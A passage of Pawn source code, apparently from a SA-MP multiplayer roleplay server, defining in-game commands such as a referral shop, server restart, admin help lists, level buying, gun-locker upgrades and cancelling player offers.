	format(LineTwo,sizeof(LineOne),"{FFFFFF}10,000 materials {00F70C}(Price: 3 tokens)\n{FFFFFF}16 respect points {00F70C}(Price: 4 tokens)\n{FFFFFF}15,000 materials {00F70C}(Price: 4 tokens)\n{FFFFFF}20 respect points {00F70C}(Price: 5 tokens)\n{FFFFFF}20,000 materials {00F70C}(Price: 5 tokens)\n{FFFFFF}One level up & 2 upgrade points {00F70C}(Price: 10 tokens)\n{FFFFFF}Car of choice from one of the dealerships {00F70C}(Price: 10 tokens)");
	format(string,sizeof(string),"%s\n%s",LineOne, LineTwo);

	ShowPlayerDialogEx(playerid, DIALOG_REFSHOP, DIALOG_STYLE_LIST, "Referral shop", string, "Purchase", "Cancel");
    return 1;
}

CMD:gmx(playerid, params[]) {
	return cmd_restartserver(playerid, params);
}

CMD:restartserver(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] < 5)
        return SendClientMessage(playerid, COLOR_GRAD2, "You're not authorized to use this command.");

	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
  		return SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");

    SetTimer("ServerRestart", 30000, false);
    SendClientMessageToAllEx(COLOR_LIGHTBLUE, "* The server will be restarting in 30 seconds.");
    return 1;
}

CMD:toggletk(playerid, params[]) {

	if(PlayerInfo[playerid][pAdmin] < 4)
        return SendClientMessage(playerid, COLOR_GRAD2, "You're not authorized to use this command.");

	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
  		return SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");

	if(AntiTK == 0) {
		foreach(Player, i) {
			if(GetPVarInt(i, "EventToken") == 1) {
				SetPlayerTeam(i, -1);
			}
		}
		SendClientMessage(playerid,COLOR_WHITE, "Players can now team kill.");
		AntiTK = 1;
	} else {
		foreach(Player, i) {
			if(GetPVarInt(i, "EventToken") == 1) {
				SetPlayerTeam(i, EventTeam[i]);
			}
		}
		SendClientMessage(playerid,COLOR_WHITE, "Players can no longer team kill.");
		AntiTK = 0;
	}
	return 1;
}

CMD:entercar(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 4)
 		return SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");

	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
  		return SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");

	new
		carid,
		seatid;

	if(sscanf(params, "ii", carid, seatid))
		return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /entercar [carid] [seatid]");

	if(carid == INVALID_VEHICLE_ID)
		return SendClientMessage(playerid, COLOR_GRAD1, "That vehicle is invalid.");

	if(seatid > 3 || seatid < 0)
		return SendClientMessage(playerid, COLOR_GRAD1, "Seats must be between 0 and 3. (0 is driver)");

	PutPlayerInVehicle(playerid, carid, seatid);
	return 1;
}

CMD:ahelp(playerid, params[]) {
	return cmd_ah(playerid, params);
}

CMD:ah(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 1) {
		SendClientMessage(playerid, COLOR_GREEN,"_______________________________________");
		SendClientMessage(playerid, COLOR_GRAD1, "*** LEVEL 1 ADMIN *** /admins /check /jail /kick /skick /aduty /showflags /nrn /namechanges /reports /ar /tr /post /nro /nao");
		SendClientMessage(playerid, COLOR_GRAD1, "*** LEVEL 1 ADMIN *** /rtnc /sth /norevive");

		if(PlayerInfo[playerid][pAdmin] >= 2) {
			SendClientMessage(playerid, COLOR_GRAD2,"*** LEVEL 2 ADMIN *** /spec /freeze /unfreeze /gethere /gotoid /gotoplayerscar /setvw /setint /oldcar /gotocar /entercar /jetpack /paused");
			SendClientMessage(playerid, COLOR_GRAD2,"*** LEVEL 2 ADMIN *** /afk /gotoco /(o)flag /clearflag /ban /sban /hhcheck /slap /belt /listguns /warn /(o)ipcheck /ip /goto /mark /mark2");
			SendClientMessage(playerid, COLOR_GRAD2,"*** LEVEL 2 ADMIN *** /watch /hospital /prisoners /sendtols /nmute /nunmute /admute /adunmute /anetstats /serial /approvename /denyname");
		}
		if(PlayerInfo[playerid][pAdmin] >= 3) {
			SendClientMessage(playerid, COLOR_GRAD3,"*** LEVEL 3 ADMIN *** /prison /fine /pfine /takeadminweapons /takeweapons /setskin /release /force(death/hospital) /rto /rtoreset /mole /revive");
			SendClientMessage(playerid, COLOR_GRAD3,"*** LEVEL 3 ADMIN *** /reloadpvehicles /apark /aimpound /nonewbie /owarn /ocheck /ofine /oprison /respawncar(s) /deletead /okills /kills");
			SendClientMessage(playerid, COLOR_GRAD3,"*** LEVEL 3 ADMIN *** /noooc /gcto /gcreset /switchfam /respawnfreegangvehs /atip /destroycades /flipveh /listpnamechanges");
		}
		if(PlayerInfo[playerid][pAdmin] >= 4) {
			SendClientMessage(playerid, COLOR_GRAD4,"*** LEVEL 4 ADMIN *** /asellhouse /givenos /blowup /setname /forcesave /oban /cnn /fixveh /sethp /setarmor /setarmorall /givegun /switchfac");
			SendClientMessage(playerid, COLOR_GRAD4,"*** LEVEL 4 ADMIN *** /adivorce /eventhelp /sprison /unban /unbanip /setinsurance /(goto/goin)house /pointfix /givelicense /fackick");
			SendClientMessage(playerid, COLOR_GRAD4,"*** LEVEL 4 ADMIN *** /setmyname /createpvehicle /destroypvehicle /hnext /(goto/goin)door /veh /vehname /healnear /destroycar /destroycars");
			SendClientMessage(playerid, COLOR_GRAD4,"*** LEVEL 4 ADMIN *** /setfightingstyle  /fixveh /fcreate /fdelete /fedit /creategvehicle /destroygvehicle /deletehit /countdown /refund /clearall");
			SendClientMessage(playerid, COLOR_GRAD4,"*** LEVEL 4 ADMIN *** /listtoys /dd(edit/next/near/name) /leaders /givemoney /setmoney /setstat /skiptut /sethelper /toggletk /entercar");
		}
		if(PlayerInfo[playerid][pAdmin] >= 5) {
			SendClientMessage(playerid, COLOR_GRAD5,"*** LEVEL 5 ADMIN *** /pedit /permaban /setcolor /paycheck /clearallreports /makeleader /changeuserpassword /makevip");
			SendClientMessage(playerid, COLOR_GRAD5,"*** LEVEL 5 ADMIN *** /amotd /restartserver /rmute /hedit /hname /setadminname /fixvehall /cnnn /gotodoor /dedit");
		}
		if(PlayerInfo[playerid][pAdmin] >= 6) {
			SendClientMessage(playerid, COLOR_GRAD5,"*** LEVEL 6 ADMIN *** /setadmin /motd /edit /dmp(edit/next/near) /gotodmp /createdealership /destroydealership");
			SendClientMessage(playerid, COLOR_GRAD5,"*** LEVEL 6 ADMIN *** /createcdveh /destroycdveh /forceoffduty");
		}

		if(PlayerInfo[playerid][pBanAppealer] > 0) SendClientMessage(playerid, COLOR_GRAD5, "*** BAN APPEALER *** /unban /unbanip");
		if(PlayerInfo[playerid][pGangMod] > 0) SendClientMessage(playerid, COLOR_GRAD5, "*** GANG MOD *** /fedit");
	}
	return 1;
}

CMD:charity(playerid, params[]) {
	new
		string[128],
		moneys;

	if(isnull(params))
		return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /charity [amount]");

	moneys = strval(params);

	if(moneys < 0)
		return SendClientMessage(playerid, COLOR_GRAD1, "That's not enough!");

	if(GetPlayerCash(playerid) < moneys)
		return SendClientMessage(playerid, COLOR_GRAD1, "You don't have that much money.");

	GivePlayerCash(playerid, -moneys);
	format(string, sizeof(string), "%s, thank you for your donation of $%d.",GetPlayerNameEx(playerid), moneys);
	PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
	SendClientMessage(playerid, COLOR_GRAD1, string);
	return 1;
}

CMD:resetupgrades(playerid, params[]) {
	if(gPlayerLogged[playerid] == 0) {
		SendClientMessage(playerid, COLOR_GRAD1, "You're not logged in.");
	}
	else if(GetPlayerCash(playerid) < 10000) {
		SendClientMessage(playerid, COLOR_GRAD1, "You need $10,000 to reset your upgrade points.");
	}
	else if(PlayerInfo[playerid][pLevel] < 2) {
		SendClientMessage(playerid, COLOR_GRAD1, "You must be at least level 2.");
	}
	else {
		PlayerInfo[playerid][gPupgrade] = (PlayerInfo[playerid][pLevel]-2)*2;
		PlayerInfo[playerid][pSarmor] = 0.0;

		new	bool: iSaveHouses; // We don't want to save houses every time

		if(PlayerInfo[playerid][pHouse] != INVALID_HOUSE_ID) {
			HouseInfo[PlayerInfo[playerid][pHouse]][hGLUpgrade] = 1;
			iSaveHouses = true;
		}
		if(PlayerInfo[playerid][pHouse2] != INVALID_HOUSE_ID) {
			HouseInfo[PlayerInfo[playerid][pHouse2]][hGLUpgrade] = 1;
			iSaveHouses = true;
		}
		for(new d = 0 ; d < MAX_PLAYERVEHICLES; d++)
		{
			PlayerVehicleInfo[playerid][d][pvWepUpgrade] = 0;
		}
		if(iSaveHouses) SaveHouses();

		GivePlayerCash(playerid,-10000);
		PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);

		new	szMessage[73];

		format(szMessage, sizeof(szMessage), "You have reset your upgrades - you now have %i unspent upgrade points.",PlayerInfo[playerid][gPupgrade]);
		SendClientMessage(playerid, COLOR_GRAD2, szMessage);
	}
	return 1;
}

CMD:leaders(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 4)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }

		SendClientMessage(playerid, COLOR_WHITE, "Faction leaders online:");

		new	string[128], sz_FacInfo[3][64];

		foreach(Player, i) if(PlayerInfo[i][pLeader] >= 1) {
			GetPlayerFactionInfo(i, sz_FacInfo[0], sz_FacInfo[1], sz_FacInfo[2]);
			format(string, sizeof(string), "(%s) %s %s", sz_FacInfo[2], sz_FacInfo[0], GetPlayerNameEx(i));
			SendClientMessage(playerid, COLOR_GRAD2, string);
		}
	}
	return 1;
}

CMD:findjob(playerid, params[])
{
	if(CheckPointCheck(playerid))
	{
 		SendClientMessage(playerid, COLOR_WHITE, "Please ensure that your current checkpoint is destroyed first (you either have material packages, or another existing checkpoint).");
   		return 1;
   	}
	ShowPlayerDialogEx(playerid, FINDJOB, DIALOG_STYLE_LIST, "Select a job", "Detective\nLawyer\nWhore\nDrug Dealer\nCar Mechanic\nBodyguard\nArms Dealer\nBoxer\nDrug Smuggler\nTaxi Driver\nCraftsman\nBartender\nTrucker\nPizza Boy\nFishing", "Select", "Cancel");
    return 1;
}

CMD:shakehand(playerid, params[])
{
	new string[128], giveplayerid, style;
	if(sscanf(params, "ud", giveplayerid, style)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /shakehand [playerid/partofname] [style (1-8)]");

	if(IsPlayerConnected(giveplayerid))
	{
		if(giveplayerid == playerid)
		{
			SendClientMessage(playerid, COLOR_GREY, "You can't shake your own hand.");
			return 1;
		}
		if(style > 0 && style < 11)
		{
			new Float: ppFloats[3];

			GetPlayerPos(giveplayerid, ppFloats[0], ppFloats[1], ppFloats[2]);

			if(!IsPlayerInRangeOfPoint(playerid, 5, ppFloats[0], ppFloats[1], ppFloats[2]))
			{
				SendClientMessage(playerid, COLOR_GREY, "You're too far away. You can't shake hands right now.");
				return 1;
			}

			ShakeHandRequest[giveplayerid] = playerid;
			ShakeHandStyle[giveplayerid] = style;

			PreloadAnims(giveplayerid);
			PreloadAnims(playerid);

			format(string, sizeof(string), "You have requested to shake %s's hand, please wait for them to respond.", GetPlayerNameEx(giveplayerid));
			SendClientMessage(playerid, COLOR_WHITE, string);

			format(string, sizeof(string), "%s has requested to shake your hand, please use '/accept handshake' to approve the hand shake.", GetPlayerNameEx(playerid));
			SendClientMessage(giveplayerid, COLOR_WHITE, string);
		}
		else
		{
			SendClientMessage(playerid, COLOR_WHITE, "USAGE: /shakehand [playerid/partofname] [style (1-8)]");
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "Invalid player specified.");
	}
	return 1;
}

CMD:buylevel(playerid, params[])
{
	if(gPlayerLogged[playerid] != 0)
	{
		if(PlayerInfo[playerid][pLevel] >= 0)
		{
			new nxtlevel = PlayerInfo[playerid][pLevel]+1;
			new costlevel = nxtlevel*2500;
			new expamount = nxtlevel*levelexp;

			if(GetPlayerCash(playerid) < costlevel)
			{
				new string[128];
				format(string, sizeof(string), "You don't have enough cash ($%d).",costlevel);
				SendClientMessage(playerid, COLOR_GRAD1, string);
				return 1;
			}
			else if(PlayerInfo[playerid][pRespect] < expamount)
			{
				new string[58];
				format(string, sizeof(string), "You need %d more respect points to buy your next level.", expamount - PlayerInfo[playerid][pRespect]);
				SendClientMessage(playerid, COLOR_GRAD1, string);
				return 1;
			}
			else
			{
				new string[92];
				format(string, sizeof(string), "~g~LEVEL UP~n~~w~You're Now Level %d", nxtlevel);
				PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
				GivePlayerCash(playerid, (-costlevel));
				PlayerInfo[playerid][pLevel]++;
				PlayerInfo[playerid][pRespect] = PlayerInfo[playerid][pRespect]-expamount;
				PlayerInfo[playerid][gPupgrade] = PlayerInfo[playerid][gPupgrade]+2;
				GameTextForPlayer(playerid, string, 5000, 1);
				format(string, sizeof(string), "You have bought level %d for $%d, and gained %i upgrade points! /upgrade to use them.", nxtlevel, costlevel, PlayerInfo[playerid][gPupgrade]);
				SendClientMessage(playerid, COLOR_GRAD1, string);
				SetPlayerScore(playerid, PlayerInfo[playerid][pLevel]);
			}
		}
		return 1;
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You're not logged in.");
	}
	return 1;
}

CMD:upgrade(playerid, params[])
{
	if(isnull(params))
	{
		new string[64];
		format(string, sizeof(string), "USAGE: /upgrade [upgradename] (you have %d upgrade points).",PlayerInfo[playerid][gPupgrade]);
		SendClientMessage(playerid, COLOR_GREEN,"_______________________________________");
		SendClientMessage(playerid, COLOR_WHITE,"*** UPGRADES ***");
		SendClientMessage(playerid, COLOR_GRAD2,string);
		//SendClientMessage(playerid, COLOR_GRAD5, "armor gunlocker gunlocker2 cargunlocker");
		SendClientMessage(playerid, COLOR_GRAD5, "armor gunlocker cargunlocker");
		SendClientMessage(playerid, COLOR_GREEN,"_______________________________________");
		return 1;
	}
	if(PlayerInfo[playerid][gPupgrade] >= 1)
	{
		if(PlayerInfo[playerid][pLevel] >= 1 && strcmp(params, "armor", true) == 0)
		{
			if(PlayerInfo[playerid][pSarmor] < 100)
			{
				new string[51];
				++PlayerInfo[playerid][pSarmor];
				PlayerInfo[playerid][gPupgrade]--;
				format(string, sizeof(string), "New Upgrade: You will now spawn with %.2f armor.",PlayerInfo[playerid][pSarmor]);
				SendClientMessage(playerid, COLOR_GRAD6, string);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD6, "   You have maximum spawn armor.");
				return 1;
			}
		}
		else if(strcmp(params, "gunlocker", true) == 0)
		{
			new playername[MAX_PLAYER_NAME];
			GetPlayerName(playerid, playername, sizeof(playername));
			if(PlayerInfo[playerid][pHouse] != INVALID_HOUSE_ID && strcmp(playername, HouseInfo[PlayerInfo[playerid][pHouse]][hOwner], true) == 0)
			{
				if(PlayerInfo[playerid][gPupgrade] < 2)
				{
					SendClientMessage(playerid, COLOR_GRAD6, "   You need at least 2 respect points to upgrade your gun locker.");
					return 1;
				}
				switch(HouseInfo[PlayerInfo[playerid][pHouse]][hGLUpgrade])
				{
					case 0:
					{
						if(PlayerInfo[playerid][pCash] >= 5000)
						{
							PlayerInfo[playerid][pCash] -= 5000;
							HouseInfo[PlayerInfo[playerid][pHouse]][hGLUpgrade] = 1;
							HouseInfo[PlayerInfo[playerid][pHouse]][hWeapons][0] = 0;
							SendClientMessage(playerid, COLOR_WHITE, "You have purchased a new locker space, you have been charged $5000.");
							SendClientMessage(playerid, COLOR_GRAD2, "HINT: To use your lockers, the commands are /storegun and /getgun. You have 1 locker space available.");
						}
						else
						{
							SendClientMessage(playerid, COLOR_WHITE, "You don't have enough ($5000).");
							return 1;
						}
					}
					case 1:
					{
						if(PlayerInfo[playerid][pCash] >= 5000)
						{
							PlayerInfo[playerid][pCash] -= 5000;
							HouseInfo[PlayerInfo[playerid][pHouse]][hGLUpgrade]++;
							HouseInfo[PlayerInfo[playerid][pHouse]][hWeapons][1] = 0;
							SendClientMessage(playerid, COLOR_WHITE, "You have purchased a new locker space, you have been charged $5000.");
							SendClientMessage(playerid, COLOR_GRAD2, "HINT: To use your lockers, the commands are /storegun and /getgun. You have 2 locker space available.");
						}
						else
						{
							SendClientMessage(playerid, COLOR_WHITE, "You don't have enough ($5000).");
							return 1;
						}
					}
					case 2:
					{
						if(PlayerInfo[playerid][pCash] >= 5000)
						{
							PlayerInfo[playerid][pCash] -= 5000;
							HouseInfo[PlayerInfo[playerid][pHouse]][hGLUpgrade]++;
							HouseInfo[PlayerInfo[playerid][pHouse]][hWeapons][2] = 0;
							SendClientMessage(playerid, COLOR_WHITE, "You have purchased a new locker space, you have been charged $5000.");
							SendClientMessage(playerid, COLOR_GRAD2, "HINT: To use your lockers, the commands are /storegun and /getgun. You have 3 locker space available.");
						}
						else
						{
							SendClientMessage(playerid, COLOR_WHITE, "You don't have enough ($5000).");
							return 1;
						}
					}
					case 3:
					{
						if(PlayerInfo[playerid][pCash] >= 5000)
						{
							PlayerInfo[playerid][pCash] -= 5000;
							HouseInfo[PlayerInfo[playerid][pHouse]][hGLUpgrade]++;
							HouseInfo[PlayerInfo[playerid][pHouse]][hWeapons][3] = 0;
							SendClientMessage(playerid, COLOR_WHITE, "You have purchased a new locker space, you have been charged $5000.");
							SendClientMessage(playerid, COLOR_GRAD2, "HINT: To use your lockers, the commands are /storegun and /getgun. You have 4 locker space available.");
						}
						else
						{
							SendClientMessage(playerid, COLOR_WHITE, "You don't have enough ($5000).");
							return 1;
						}
					}
					case 4:
					{
						if(PlayerInfo[playerid][pCash] >= 5000)
						{
							PlayerInfo[playerid][pCash] -= 5000;
							HouseInfo[PlayerInfo[playerid][pHouse]][hGLUpgrade]++;
							HouseInfo[PlayerInfo[playerid][pHouse]][hWeapons][4] = 0;
							SendClientMessage(playerid, COLOR_WHITE, "You have purchased a new locker space, you have been charged $5000.");
							SendClientMessage(playerid, COLOR_GRAD2, "HINT: To use your lockers, the commands are /storegun and /getgun. You have 5 locker space available.");
						}
						else
						{
							SendClientMessage(playerid, COLOR_WHITE, "You don't have enough ($5000).");
							return 1;
						}
					}
					case 5:
					{
						SendClientMessage(playerid, COLOR_WHITE, "Sorry, there are no more spaces available.");
						return 1;
					}
				}
				PlayerInfo[playerid][gPupgrade] -= 2;
				SaveHouses();
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD2, "You're not a house owner.");
				return 1;
			}
		}
		// Second houses disabled for now
		/*else if(strcmp(params, "gunlocker2", true) == 0)
		{
			new playername[MAX_PLAYER_NAME];
			GetPlayerName(playerid, playername, sizeof(playername));
			if(PlayerInfo[playerid][pHouse2] != INVALID_HOUSE_ID && strcmp(playername, HouseInfo[PlayerInfo[playerid][pHouse2]][hOwner], true) == 0)
			{
				if(PlayerInfo[playerid][gPupgrade] < 2)
				{
					SendClientMessage(playerid, COLOR_GRAD6, "   You need at least 2 respect points.");
					return 1;
				}
				switch(HouseInfo[PlayerInfo[playerid][pHouse2]][hGLUpgrade])
				{
					case 0:
					{
						if(PlayerInfo[playerid][pCash] >= 5000)
						{
							PlayerInfo[playerid][pCash] -= 5000;
							HouseInfo[PlayerInfo[playerid][pHouse2]][hGLUpgrade] = 1;
							HouseInfo[PlayerInfo[playerid][pHouse2]][hWeapons][0] = 0;
							SendClientMessage(playerid, COLOR_WHITE, "You have purchased a new locker space, you have been charged $5000.");
							SendClientMessage(playerid, COLOR_GRAD2, "HINT: To use your lockers, the commands are /storegun and /getgun. You have 1 locker space available.");
						}
						else
						{
							SendClientMessage(playerid, COLOR_WHITE, "You don't have enough ($5000).");
							return 1;
						}
					}
					case 1:
					{
						if(PlayerInfo[playerid][pCash] >= 5000)
						{
							PlayerInfo[playerid][pCash] -= 5000;
							HouseInfo[PlayerInfo[playerid][pHouse2]][hGLUpgrade]++;
							HouseInfo[PlayerInfo[playerid][pHouse2]][hWeapons][1] = 0;
							SendClientMessage(playerid, COLOR_WHITE, "You have purchased a new locker space, you have been charged $5000.");
							SendClientMessage(playerid, COLOR_GRAD2, "HINT: To use your lockers, the commands are /storegun and /getgun. You have 2 locker space available.");
						}
						else
						{
							SendClientMessage(playerid, COLOR_WHITE, "You don't have enough ($5000).");
							return 1;
						}
					}
					case 2:
					{
						if(PlayerInfo[playerid][pCash] >= 5000)
						{
							PlayerInfo[playerid][pCash] -= 5000;
							HouseInfo[PlayerInfo[playerid][pHouse2]][hGLUpgrade]++;
							HouseInfo[PlayerInfo[playerid][pHouse2]][hWeapons][2] = 0;
							SendClientMessage(playerid, COLOR_WHITE, "You have purchased a new locker space, you have been charged $5000.");
							SendClientMessage(playerid, COLOR_GRAD2, "HINT: To use your lockers, the commands are /storegun and /getgun. You have 3 locker space available.");
						}
						else
						{
							SendClientMessage(playerid, COLOR_WHITE, "You don't have enough ($5000).");
							return 1;
						}
					}
					case 3:
					{
						if(PlayerInfo[playerid][pCash] >= 5000)
						{
							PlayerInfo[playerid][pCash] -= 5000;
							HouseInfo[PlayerInfo[playerid][pHouse2]][hGLUpgrade]++;
							HouseInfo[PlayerInfo[playerid][pHouse2]][hWeapons][3] = 0;
							SendClientMessage(playerid, COLOR_WHITE, "You have purchased a new locker space, you have been charged $5000.");
							SendClientMessage(playerid, COLOR_GRAD2, "HINT: To use your lockers, the commands are /storegun and /getgun. You have 4 locker space available.");
						}
						else
						{
							SendClientMessage(playerid, COLOR_WHITE, "You don't have enough ($5000).");
							return 1;
						}
					}
					case 4:
					{
						if(PlayerInfo[playerid][pCash] >= 5000)
						{
							PlayerInfo[playerid][pCash] -= 5000;
							HouseInfo[PlayerInfo[playerid][pHouse2]][hGLUpgrade]++;
							HouseInfo[PlayerInfo[playerid][pHouse2]][hWeapons][4] = 0;
							SendClientMessage(playerid, COLOR_WHITE, "You have purchased a new locker space, you have been charged $5000.");
							SendClientMessage(playerid, COLOR_GRAD2, "HINT: To use your lockers, the commands are /storegun and /getgun. You have 5 locker space available.");
						}
						else
						{
							SendClientMessage(playerid, COLOR_WHITE, "You don't have enough ($5000).");
							return 1;
						}
					}
					case 5:
					{
						SendClientMessage(playerid, COLOR_WHITE, "Sorry, there are no more spaces available.");
						return 1;
					}
				}
				PlayerInfo[playerid][gPupgrade]--;
				SaveHouses();
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD2, " You don't own a second house.");
				return 1;
			}
		}*/
		else if(strcmp(params, "cargunlocker", true) == 0)
		{
			new Float: x, Float: y, Float: z;
			for(new d = 0 ; d < MAX_PLAYERVEHICLES; d++)
			{
				if(PlayerVehicleInfo[playerid][d][pvId] != INVALID_PLAYER_VEHICLE_ID) GetVehiclePos(PlayerVehicleInfo[playerid][d][pvId], x, y, z);
				if(IsPlayerInRangeOfPoint(playerid, 3.0, x, y, z))
				{
					if(PlayerInfo[playerid][gPupgrade] < 2)
					{
						SendClientMessage(playerid, COLOR_GRAD6, "   You need at least 2 respect points.");
						return 1;
					}
					if(PlayerVehicleInfo[playerid][d][pvWepUpgrade] < 2)
					{
						new string[114];
						GameTextForPlayer(playerid,"~r~Vehicle Gunlocker Upgraded!",5000,6);
						PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
						PlayerVehicleInfo[playerid][d][pvWepUpgrade]++;
						PlayerInfo[playerid][gPupgrade] = PlayerInfo[playerid][gPupgrade]-2;
						SendClientMessage(playerid, COLOR_WHITE, "You have purchased a new car locker space.");
						format(string, sizeof(string), "HINT: To use your car lockers, the commands are /trunkput and /trunktake. You have %d locker spaces available.", PlayerVehicleInfo[playerid][d][pvWepUpgrade]+1);
						SendClientMessage(playerid, COLOR_GRAD2, string);
						return 1;
					}
					else
					{
						SendClientMessage(playerid, COLOR_GREY, "You have already upgraded your car gunlocker slots.");
						return 1;
					}
				}
			}
			SendClientMessage(playerid, COLOR_GREY, "You're not near any vehicle that you own.");
			return 1;
		}
		else
		{
			SendClientMessage(playerid, COLOR_GRAD6, "   Unrecognized upgrade.");
			return 1;
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD6, "   You have 0 Upgrade Points.");
		return 1;
	}
	return 1;
}

CMD:cancelreport(playerid, params[]) return cmd_cancel(playerid, "report");

CMD:cancel(playerid, params[])
{
	new
		string[128],
		choice[32];
	if(sscanf(params, "s[32]", choice))
	{
		SendClientMessage(playerid, COLOR_WHITE, "|__________________ Cancel __________________|");
		SendClientMessage(playerid, COLOR_WHITE, "USAGE: /cancel [name]");
		SendClientMessage(playerid, COLOR_GREY, "Available names: Sex, Mats, Pot, Crack, Weapon, Craft, Repair, Lawyer, Bodyguard, Car, Boxing, Live, Report");
		SendClientMessage(playerid, COLOR_GREY, "Available names: Taxi, Bus, Medic, Mechanic, Ticket, Witness, Marriage, Divorce, Drink, House, Truck");
		SendClientMessage(playerid, COLOR_WHITE, "|____________________________________________|");
		return 1;
	}

	if(strcmp(choice,"sex",true) == 0) { SexOffer[playerid] = 999; SexPrice[playerid] = 0; }
	else if(strcmp(choice,"live",true) == 0) {
		if(TalkingLive[playerid] != INVALID_PLAYER_ID || LiveOffer[playerid] != INVALID_PLAYER_ID ) {
			cmd_live(TalkingLive[playerid], "");
			TalkingLive[TalkingLive[playerid]] = INVALID_PLAYER_ID;
			TalkingLive[LiveOffer[playerid]] = INVALID_PLAYER_ID;
			LiveOffer[LiveOffer[playerid]] = INVALID_PLAYER_ID;
			LiveOffer[TalkingLive[playerid]] = INVALID_PLAYER_ID;
		}
		TalkingLive[playerid] = INVALID_PLAYER_ID;
		LiveOffer[playerid] = INVALID_PLAYER_ID;
	}
	else if(strcmp(choice,"mats",true) == 0) { MatsOffer[playerid] = 999; MatsPrice[playerid] = 0; MatsAmount[playerid] = 0; }
	else if(strcmp(choice,"pot",true) == 0) { PotOffer[playerid] = 999; PotPrice[playerid] = 0; PotGram[playerid] = 0; }
	else if(strcmp(choice,"crack",true) == 0) {  CrackOffer[playerid] = 999;  CrackPrice[playerid] = 0; CrackGram[playerid] = 0; }
	else if(strcmp(choice,"weapon",true) == 0) { GunOffer[playerid] = 999; GunId[playerid] = 0; }
	else if(strcmp(choice,"craft",true) == 0) { CraftOffer[playerid] = 999; CraftId[playerid] = 0; }
	else if(strcmp(choice,"repair",true) == 0) {	RepairOffer[playerid] = 999; RepairPrice[playerid] = 0; RepairCar[playerid] = 0; }
	else if(strcmp(choice,"lawyer",true) == 0) { WantLawyer[playerid] = 0; CallLawyer[playerid] = 0; }
	else if(strcmp(choice,"bodyguard",true) == 0) { GuardOffer[playerid] = 999; GuardPrice[playerid] = 0; }
	else if(strcmp(choice,"car",true) == 0) { VehicleOffer[playerid] = 999; VehiclePrice[playerid] = 0; VehicleId[playerid] = -1; }
	else if(strcmp(choice,"house",true) == 0) { HouseOffer[playerid] = 999; HousePrice[playerid] = 0; House[playerid] = 0; }
	else if(strcmp(choice,"boxing",true) == 0) { BoxOffer[playerid] = 999; }
	else if(strcmp(choice,"witness",true) == 0) { MarryWitnessOffer[playerid] = 999; }
	else if(strcmp(choice,"marriage",true) == 0) { ProposeOffer[playerid] = 999; }
	else if(strcmp(choice,"divorce",true) == 0) { DivorceOffer[playerid] = 999; }
	else if(strcmp(choice,"drink",true) == 0) { DrinkOffer[playerid] = INVALID_PLAYER_ID; }
	else if(strcmp(choice,"report",true) == 0) {
		for(new i = 0; i < MAX_REPORTS; i++)
		{
			if(Reports[i][ReportFrom] == playerid && Reports[i][BugReport] == 0)
			{
				Reports[i][ReportFrom] = 999;
				Reports[i][BeingUsed] = 0;
				Reports[i][TimeToExpire] = 0;
			}
		}
	}
	else if(strcmp(choice,"truck",true) == 0) {
 		DestroyProgressBar(LoadTruckBar[playerid]);
		LoadTruckBar[playerid] = INVALID_BAR_ID;
		LoadTruckTime[playerid] = 0;
		DeletePVar(playerid, "TruckDeliver");
		TruckUsed[playerid] = INVALID_VEHICLE_ID;
		gPlayerCheckpointStatus[playerid] = CHECKPOINT_NONE;
 		DisablePlayerCheckpoint(playerid);
	}
	else if(strcmp(choice,"contract",true) == 0) {
		new Float:X, Float:Y, Float:Z;
		GetPlayerPos(playerid, X, Y, Z);

 		if(!IsPlayerInRangeOfPoint(GoChase[playerid], 225, X, Y, Z))
 		{
			new Float:health;
			GetPlayerHealth(playerid, health);
			new hpint = floatround(health, floatround_round);
			if(hpint >=  80)
			{
				HitToGet[playerid] = 999;
				HitOffer[playerid] = 999;
				GetChased[GoChase[playerid]] = 999;
				GotHit[GoChase[playerid]] = 0;
				GoChase[playerid] = 999;
			} else return SendClientMessage(playerid, COLOR_GRAD1, "You can't cancel the contract if your health is below 80!");
		} else return SendClientMessage(playerid, COLOR_GRAD1, "You're too close to the target to cancel the contract. There must be a greater distance between you and the target.");
	}
	else if(strcmp(choice,"ticket",true) == 0) { TicketOffer[playerid] = 999; TicketMoney[playerid] = 0; }
	else if(strcmp(choice,"medic",true) == 0) { if(IsPlayerConnected(MedicCall)) { if(MedicCall == playerid) { MedicCall = 999; } else { SendClientMessage(playerid, COLOR_GREY, "   You're not the current Caller!"); return 1; } } }
	else if(strcmp(choice,"mechanic",true) == 0) { if(IsPlayerConnected(MechanicCall)) { if(MechanicCall == playerid) { MechanicCall = 999; } else { SendClientMessage(playerid, COLOR_GREY, "   You're not the current Caller!"); return 1; } } }
	else if(strcmp(choice,"taxi",true) == 0)
	{
		if(TaxiCall < 999)
		{
